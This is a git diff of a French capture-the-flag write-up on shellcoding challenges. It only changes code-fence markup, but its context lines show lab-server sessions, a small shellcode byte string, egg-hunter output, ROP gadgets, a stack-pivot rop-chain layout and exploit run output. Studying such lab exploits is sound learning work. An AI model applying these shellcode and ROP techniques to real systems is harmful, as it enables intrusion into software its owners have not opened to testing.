@@ -22,7 +22,7 @@ Le libellé de ce premier exercice de shellcoding est le suivant :
 
 Quand on se connecte au serveur on obtient les instructions complémentaires suivantes :  
 
-```plain
+```
 $ ncat 192.168.1.64 9090 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.64:9090.
@@ -65,7 +65,7 @@ get_addr:
 
 Sous mon système 64 bits la compilation pour du 32 bits (demandé par le challenge) se fait de cette manière :  
 
-```plain
+```
 $ nasm -f elf32 main.s
 $ ld -m elf_i386 -o main main.o
 ld: AVERTISSEMENT: ne peut trouver le symbole d'entrée _start; utilise par défaut 0000000008048060
@@ -91,7 +91,7 @@ Désassemblage de la section .text:
 
 Il suffit alors d'envoyer la chaîne e8000000005883e805c3 au serveur :  
 
-```plain
+```
 Ncat: Connected to 192.168.1.64:9090.
 Set EAX to the address of your first shellcode instruction.
 Then, return execution to the program.
@@ -106,7 +106,7 @@ Pas de quoi fouetter un chat.
 
 On peut aussi avoir recours à *rasm2* (outil fournit avec [*radare2*](http://www.radare.org/r/)) pour déterminer les opcodes d'une instruction ASM :  
 
-```plain
+```
 $ rasm2 -a x86 'call 5'
 e800000000
 ```
@@ -118,7 +118,7 @@ X97:L97 (200 points)
 
 Et pour plus de détails (car c'est pas forcément très clair) :  
 
-```plain
+```
 Welcome to the shellcode 2 challenge
 Please send your egg hunter and deobfuscator shellcode as raw bytes                                                             
 The egg will be between 0xb74d9000 and 0xb75d8fff                                                                               
@@ -256,7 +256,7 @@ _start:
 
 Exécution par le serveur :  
 
-```plain
+```
 Welcome to the shellcode 2 challenge
 Please send your egg hunter and deobfuscator shellcode as raw bytes
 The egg will be between 0xb74f0000 and 0xb75effff
@@ -304,7 +304,7 @@ found:
 
 Et il apparaît que le tag est retrouvé (comme dans l'exemple ci-dessous où l'on voit bien *CySC* apparaître, mais pas à tous les coups).  
 
-```plain
+```
 Welcome to the shellcode 2 challenge
 Please send your egg hunter and deobfuscator shellcode as raw bytes
 The egg will be between 0xb74f0000 and 0xb75effff
@@ -366,7 +366,7 @@ not_found:
 
 Ce qui nous donne :  
 
-```plain
+```
 $ ncat 192.168.1.64 16831 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.64:16831.
@@ -601,7 +601,7 @@ s.close()
 
 Exécution du code :  
 
-```plain
+```
 start = b74c4000
 Sending stage1 as hexencoded string...
 Sending stage2 as raw bytes...
@@ -646,7 +646,7 @@ Dans le cadre d'une exploitation il ne sera pas forcément nécessaire de pivote
 
 Entrons dans le vif du sujet. Que nous demande le programme serveur ?  
 
-```plain
+```
 $ ncat 192.168.1.64 22523 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.64:22523.
@@ -674,7 +674,7 @@ En regardant les chaînes à l'intérieur on trouve une référence au fichier *
 
 Jetons un œil supplémentaire avec *radare2* (je me suis basé sur [cet article](http://dustri.org/b/exploiting-zengarden-boston-key-party-2014-pwn300-with-radare2.html) car je ne suis pas encore un expert avec cet outil) :  
 
-```plain
+```
 $ radare2 8305f5c99ba1d89802940f6e68f802f5-sc03 
  -- Now featuring NoSQL!
 [0x08048e08]> iI
@@ -1065,19 +1065,19 @@ Ce qu'on retiendra :
 
 Pour trouver des ROPs dans l'exécutable j'ai eu recours à l'outil [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) écrit sur Python et basé entre autres sur [Capstone](http://www.capstone-engine.org/). Il suffit de lui spécifier le binaire via le paramètre binary :  
 
-```plain
+```
 $ ./ROPgadget.py --binary 8305f5c99ba1d89802940f6e68f802f5-sc03
 ```
 
 Rapidement j'ai trouvé un gadget de choix pour le pivot :  
 
-```plain
+```
 0x080511ec : xchg eax, esp ; ret
 ```
 
 J'ai fait une première esquisse de ma rop-chain de cette manière selon mon objectif :  
 
-```plain
+```
 ----- top -----
 
 arg2 : adresse de payload (qui sert de buffer d'écriture)
@@ -1100,7 +1100,7 @@ Comme *load\_flag* prend deux arguments, le second appel devra être un gadget c
 
 On trouve de nombreux gadgets en pop-pop-ret mais j'ai choisi le suivant :  
 
-```plain
+```
 0x0804c3ea : pop ebx ; pop esi ; ret
 ```
 
@@ -1114,7 +1114,7 @@ Quand à notre gadget il ne touche pas ebp par conséquent le descripteur est to
 
 J'ai trouvé un gadget fort sympathique qui placera ainsi la socket dans le registre eax avant de la placer dans la pile où il faut :  
 
-```plain
+```
 0x080c6569 : mov eax, dword ptr [ebp + 8] ; add eax, ebx ; mov dword ptr [esp], eax ; call esi
 ```
 
@@ -1127,7 +1127,7 @@ Si j'ai choisi précédemment un *pop ebx; pop esi; ret* parmi les pop-pop-ret e
 
 Ainsi notre rop-chain aura ce look :  
 
-```plain
+```
 ----- top -----
 
 adresse payload (pour etre sur)
@@ -1148,7 +1148,7 @@ J'ai placé deux fois l'adresse du payload à la fin parce que j'ai du mal à m'
 
 Et avec les valeurs :  
 
-```plain
+```
 ----- top -----
 
 adresse payload
@@ -1228,7 +1228,7 @@ sock.close()
 
 Et à la première exécution (Yes !) :  
 
-```plain
+```
 $ ./rop.py 
 Payload addr is b7731000
 Received RoofTitleSuspicious854A SIGSEGV was raised during shellcode execution. Exiting
